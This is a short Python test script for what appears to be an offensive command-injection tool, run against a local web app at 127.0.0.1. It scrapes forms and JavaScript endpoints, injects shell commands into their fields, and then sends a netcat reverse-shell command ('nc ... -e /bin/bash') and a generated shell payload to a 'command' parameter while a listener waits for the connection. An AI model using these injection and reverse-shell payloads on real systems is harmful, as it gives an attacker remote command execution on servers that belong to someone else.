#!/usr/bin/python

# local tests

from payloads import Monkey, Generator

from server import ReverseListener

url = 'http://127.0.0.1:3111/home'

monkey = Monkey(url)

print('-------------------------Parsing tests-------------------------------')

print(monkey.get_forms())
print(monkey.get_inputs())
print(monkey.get_js_endpoints())
print(monkey.get_js_urls())
print(monkey.get_js_http_methods())


print('-------------------------Form submit tests---------------------------')

injectable = {}
form_inputs = monkey.get_forms()[0].find_all("input")

for form_input in form_inputs:
    print(form_input)
    injectable[form_input.get("name")] = "ls"

res = monkey.inject_forms(injectable)

print(res)

print('-------------------------JS urls submit tests---------------------------')

injectable = {}
inputs = monkey.get_inputs()
js_urls = monkey.get_js_urls()

for (input, url) in zip(inputs, js_urls):
    print(input, url)
    injectable[input.get("name")] = "ls"

res = monkey.inject_fetch(injectable)

print(res)

print('-------------------------Payload injection tests---------------------')

ip = "127.0.0.1"
port = 8999

listener = ReverseListener(ip, port, once=True, cb=lambda: 'ls')

listener.start()

print('----------------netcat:')

res = monkey.inject_fetch({ 'command': f"nc {ip} {port} -e /bin/bash\n" })
print(res)

listener.stop()

print('----------------shell:')

ip = "127.0.0.1"
port = 8999

listener = ReverseListener(ip, port, once=True, cb=lambda: 'ls')

listener.start()

payload = Generator.shell(lhost=ip, lport=port, s='sh')
print(payload)

res = monkey.inject_fetch({ 'command': payload })
print(res)

listener.stop()

print('----------------binary:')

print('todo')

quit()